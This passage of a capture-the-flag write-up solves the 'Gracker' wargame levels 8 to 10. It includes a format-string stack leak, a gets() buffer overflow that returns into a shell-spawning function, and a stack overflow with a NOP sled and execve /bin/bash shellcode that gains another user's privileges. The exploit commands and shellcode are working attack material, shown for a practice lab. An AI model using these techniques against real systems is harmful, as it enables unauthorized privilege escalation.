        if(strcmp(buffer,password)==0) {
            printf("\ncorrect! come in.\n");
        } else{
            printf("\nYou must be an Obj-C programmer. GET OUT OF HERE!\n");
        }
    }
    level8@gracker:/tmp/l8tmp$ echo "1234AAAABCDE" > pass
    level8@gracker:/tmp/l8tmp$ ./level8
    What is your name?
    %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
    0000000af7fcec20ffffda40ffffda38f7fdc5f9343332314141414145444342f7fdc500fffffffff7ffd000f7e3537800fd2000
    You must be an Obj-C programmer. GET OUT OF HERE!
    level8@gracker:/tmp/l8tmp$ python
    Python 2.7.9 (default, Mar  1 2015, 12:57:24)
    [GCC 4.9.2] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> "0000000af7fcec20ffffda40ffffda38f7fdc5f9343332314141414145444342f7fdc500fffffffff7ffd000f7e3537800fd2000".decode("hex")
    '\x00\x00\x00\n\xf7\xfc\xec \xff\xff\xda@\xff\xff\xda8\xf7\xfd\xc5\xf94321AAAAEDCB\xf7\xfd\xc5\x00\xff\xff\xff\xff\xf7\xff\xd0\x00\xf7\xe3Sx\x00\xfd \x00'
                                                                          ^----------^

The test password "1234AAAABCDE" became "4321AAAAEDCB", that's because of the Endianess of the system. And this has to be corrected:

    level8@gracker:/tmp/l8tmp$ ./level8
    What is your name?
    4321AAAAEDCB
    4321AAAAEDCB
    You must be an Obj-C programmer. GET OUT OF HERE!
    level8@gracker:/tmp/l8tmp$
    level8@gracker:/tmp/l8tmp$ ./level8
    What is your name?
    1234AAAABCDE
    1234AAAABCDE
    correct! come in.

Now we know how to interpret the leaked bytes. And we can attack the listening service.
```

# Gracker Level 9



```
┌───────────────────┐                                                
│ Proof your skills │                                                
└───────────────────┘  
You got the correct password and the security guard is impressed.
He asks you if you got a minute to help him with a problem. He
found a buffer overflow, and can exploit it easily, the problem is
that he can't get a proper shell. It looks like that STDIN closes
after he uses `echo` to construct the exploit string, and thus loosing
access to the shell. Can you show him a trick how he can keep STDIN
alive so that he can use the spawned shell?

This level is very similar to level6, but with one tiny difference, which
might be difficult.
```

This proved an easier challenge than the previous.

Let's open up GDB and check out these functions

```
All defined functions:

Non-debugging symbols:
0x0804839c  _init
0x080483d0  setresuid@plt
0x080483e0  printf@plt
0x080483f0  gets@plt
0x08048400  geteuid@plt
0x08048410  getegid@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __gmon_start__@plt
0x08048450  exit@plt
0x08048460  __libc_start_main@plt
0x08048470  setresgid@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  spawn_shell
0x080485db  gates_of_arjia
0x08048606  main
0x08048660  __libc_csu_init
0x080486d0  __libc_csu_fini
0x080486d4  _fini
```

How about the source?

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

// gcc level9.c -fno-stack-protector -z execstack -m32 -o level9

void spawn_shell() {
    printf("Welcome to Arjia City!\n");
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    system("/bin/sh");
}

void gates_of_arjia() {
    char buffer[32];
    gets(buffer);
    printf("Return to: %p\n", __builtin_return_address(0));
}

int main(int argc, char **argv)
{
    printf("Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.\n");
    printf("What are you doing here? Are you a user or a program?\n");
    printf("Where did you come from? Proof your identity:\n");
    gates_of_arjia();
    exit(0);
}
```

So with this now in mind, we just have to run the program and input the address of the `spawn_shell` method.

Finding the buffer was as easy as spamming as many 'A's until we got it into the return address, using python.

```
level9@gracker:~$ echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\{\x85\x04\x08" | /matrix/level9/level9 
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x804857b
Welcome to Arjia City!
zsh: done                          echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\{\x85\x04\x08" | 
zsh: illegal hardware instruction  /matrix/level9/level9
```

This is odd... We are unable to access it. Seems like this is not completely the case as Level 6 as it said. Also it seemed to have a certain restriction on the hex value of 0x7b, which meant I had to manually add it as `\{`, which allowed me to have it as a hex value. It seemed it be a minor format string.

We got into Arjia City, but not completely. Let's read that description again.


```
It looks like that STDIN closes
after he uses `echo` to construct the exploit string, and thus loosing
access to the shell. Can you show him a trick how he can keep STDIN
alive so that he can use the spawned shell?
```

It seems like this is the point of the challenge. After doing research, [I found our solution](https://unix.stackexchange.com/questions/620561/keep-pipe-open-stdin-in-connected-to-terminal-after-pipe).

After running this command:

`{ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\{\x85\x04\x08"; cat; } | /matrix/level9/level9`

I am able to access the flag!


# Gracker Level 10

```
    level10@gracker:/matrix/level10$ gdb level10
    GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
    Reading symbols from level10...(no debugging symbols found)...done.
    (gdb) set disassembly-flavor intel
    (gdb) r
    Starting program: /matrix/level10/level10
                              ,               ,
      Eevee                   \.           .'/
           :L73               \  \ .---. .-' /
      ┃ HP:============        '. '     `\_.'
      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                                 (  __   /   .' \
                                .''.___.'--,/\_,|
                               {  /     \   }   |
                                '.\     /_.'    /
                                 |'-.-',  `; _.'
                                 |  |  |   |`
          .-. \_/ .-.            `""`""`"""`
          \.-\/=\/.-/             Kakuna
       '-./         \.-'           :L12          ┃
      .--|          |--.        HP:============  ┃
     (((_)\         /(_)))            42/42      ┃
      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
        '.__       __.'(_))
            /     \     //
           |       |__.'/
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    ┃                       ┃                    ┃
    ┃                       ┃ 1) FIGHT   2) PkMn ┃
    ┃                       ┃ 3) ITEM    4) RUN  ┃
    ┃                       ┃                    ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    Select: 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                                            ┃
    ┃ Kakuna attacks Eevee but miss.             ┃
    ┃ Eeve attacks Kakuna, but misses.           ┃
    ┃                                            ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Because of the loop we will not easily return from the game-loop function. That's why we have to choose RUN as an option to return, after we smashed the stack.


                          ,               ,
      Eevee                   \.           .'/
           :L73               \  \ .---. .-' /
      ┃ HP:============        '. '     `\_.'
      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                                 (  __   /   .' \
                                .''.___.'--,/\_,|
                               {  /     \   }   |
                                '.\     /_.'    /
                                 |'-.-',  `; _.'
                                 |  |  |   |`
          .-. \_/ .-.            `""`""`"""`
          \.-\/=\/.-/             Kakuna
       '-./         \.-'           :L12          ┃
      .--|          |--.        HP:============  ┃
     (((_)\         /(_)))            42/42      ┃
      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
        '.__       __.'(_))
            /     \     //
           |       |__.'/
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    ┃                       ┃                    ┃
    ┃                       ┃ 1) FIGHT   2) PkMn ┃
    ┃                       ┃ 3) ITEM    4) RUN  ┃
    ┃                       ┃                    ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    Select: 4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                                            ┃
    ┃ You run away!                              ┃
    ┃                                            ┃
    ┃                                            ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    (gdb) info registers
    eax            0x1e2    482
    ecx            0xffffffff   -1
    edx            0xf7fc9878   -134440840
    ebx            0xf7fc8000   -134447104
    esp            0xffffdc50   0xffffdc50
    ebp            0x41414141   0x41414141
    esi            0x0  0
    edi            0x0  0
    eip            0x41414141   0x41414141
    eflags         0x10282  [ SF IF RF ]
    cs             0x23 35
    ss             0x2b 43
    ds             0x2b 43
    es             0x2b 43
    fs             0x0  0
    gs             0x63 99

EIP is overwritten. So let's find the correct offset. And use the first input to smash the stack, and in the second loop we enter "4" to return:

    (gdb) r
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /matrix/level10/level10
                              ,               ,
      Eevee                   \.           .'/
           :L73               \  \ .---. .-' /
      ┃ HP:============        '. '     `\_.'
      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                                 (  __   /   .' \
                                .''.___.'--,/\_,|
                               {  /     \   }   |
                                '.\     /_.'    /
                                 |'-.-',  `; _.'
                                 |  |  |   |`
          .-. \_/ .-.            `""`""`"""`
          \.-\/=\/.-/             Kakuna
       '-./         \.-'           :L12          ┃
      .--|          |--.        HP:============  ┃
     (((_)\         /(_)))            42/42      ┃
      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
        '.__       __.'(_))
            /     \     //
           |       |__.'/
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    ┃                       ┃                    ┃
    ┃                       ┃ 1) FIGHT   2) PkMn ┃
    ┃                       ┃ 3) ITEM    4) RUN  ┃
    ┃                       ┃                    ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    Select: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
                              ,               ,
      Eevee                   \.           .'/
           :L73               \  \ .---. .-' /
      ┃ HP:============        '. '     `\_.'
      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                                 (  __   /   .' \
                                .''.___.'--,/\_,|
                               {  /     \   }   |
                                '.\     /_.'    /
                                 |'-.-',  `; _.'
                                 |  |  |   |`
          .-. \_/ .-.            `""`""`"""`
          \.-\/=\/.-/             Kakuna
       '-./         \.-'           :L12          ┃
      .--|          |--.        HP:============  ┃
     (((_)\         /(_)))            42/42      ┃
      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
        '.__       __.'(_))
            /     \     //
           |       |__.'/
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    ┃                       ┃                    ┃
    ┃                       ┃ 1) FIGHT   2) PkMn ┃
    ┃                       ┃ 3) ITEM    4) RUN  ┃
    ┃                       ┃                    ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
    Select: 4
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                                            ┃
    ┃ You run away!                              ┃
    ┃                                            ┃
    ┃                                            ┃
    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

    Program received signal SIGSEGV, Segmentation fault.
    0x48484848 in ?? ()

0x48484848 which is "HHHH"

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
-------- offset: 28chars ---^^^^

Let's have a look at the stack after the gets(). As you can see we have quite some nops in there already. But it will be difficult to hit it, because the stack moves around a lot depending on environment variables and other crap on the stack.

    (gdb) x/100x 0xffffdc00
    0xffffdc00: 0x00000000  0x00000000  0xffffdc28  0x080484a3
    0xffffdc10: 0x08048da4  0x00000000  0xffffdc48  0x080484cf
    0xffffdc20: 0xffffdc30  0x002c307d  0xffffdc48  0x08048510
    0xffffdc30: 0x41410034  0x41414141  0x41414141  0x41414141
    0xffffdc40: 0x41414141  0x41414141  0x41414141  0xffffdd00
    0xffffdc50: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdc60: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdc70: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdc80: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdc90: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdca0: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdcb0: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdcc0: 0x90909090  0x90909090  0x90909090  0x90909090
    0xffffdcd0: 0x580b6acc  0x68665299  0xe189702d  0x68686a52 << cc is trap
    0xffffdce0: 0x7361622f  0x69622f68  0x52e3896e  0xe1895351
    0xffffdcf0: 0x080080cd  0xf7feb130  0xffffdcfc  0x0000001c
    0xffffdd00: 0x00000001  0xffffde2e  0x00000000  0xffffde3b
    0xffffdd10: 0xffffde4a  0xffffde5d  0xffffde6e  0xffffde78

Because we don't know exactly where the stack will be without gdb,
we can start with one address and slowly move the stack address 0x20 upwards. Until we hit the trace trap.

                                                                                 change offset
    ...                                                                               vv
    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde00)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde20)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde40)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde60)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde80)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10

    zsh: broken pipe  ( python -c ; echo "id"; ) |
    zsh: trace trap   env -i ./level10

We hit the trace trap. Now we can place shellcode there:

    level10@gracker:/matrix/level10$ (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde80)+"\x90"*128+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3x52\x51\x53\x89\xe1\xcd\x80"; print "4"'; cat) | env -i ./level10
                          ,               ,
  Eevee                   \.           .'/
       :L73               \  \ .---. .-' /
  ┃ HP:============        '. '     `\_.'
  ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                             (  __   /   .' \
                            .''.___.'--,/\_,|
                           {  /     \   }   |
                            '.\     /_.'    /
                             |'-.-',  `; _.'
                             |  |  |   |`
      .-. \_/ .-.            `""`""`"""`
      \.-\/=\/.-/             Kakuna
   '-./         \.-'           :L12          ┃
  .--|          |--.        HP:============  ┃
 (((_)\         /(_)))            42/42      ┃
  `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
    '.__       __.'(_))
        /     \     //
       |       |__.'/
◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
┃                       ┃                    ┃
┃                       ┃ 1) FIGHT   2) PkMn ┃
┃                       ┃ 3) ITEM    4) RUN  ┃
┃                       ┃                    ┃
◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
Select:                           ,               ,
  Eevee                   \.           .'/
       :L73               \  \ .---. .-' /
  ┃ HP:============        '. '     `\_.'
  ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
                             (  __   /   .' \
                            .''.___.'--,/\_,|
                           {  /     \   }   |
                            '.\     /_.'    /
                             |'-.-',  `; _.'
                             |  |  |   |`
      .-. \_/ .-.            `""`""`"""`
      \.-\/=\/.-/             Kakuna
   '-./         \.-'           :L12          ┃
  .--|          |--.        HP:============  ┃
 (((_)\         /(_)))            42/42      ┃
  `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
    '.__       __.'(_))
        /     \     //
       |       |__.'/
◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
┃                       ┃                    ┃
┃                       ┃ 1) FIGHT   2) PkMn ┃
┃                       ┃ 3) ITEM    4) RUN  ┃
┃                       ┃                    ┃
◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
Select: ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                            ┃
┃ You run away!                              ┃
┃                                            ┃
┃                                            ┃
◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
id
uid=1010(level10) gid=1010(level10) euid=1011(level11) groups=1010(level10)
```
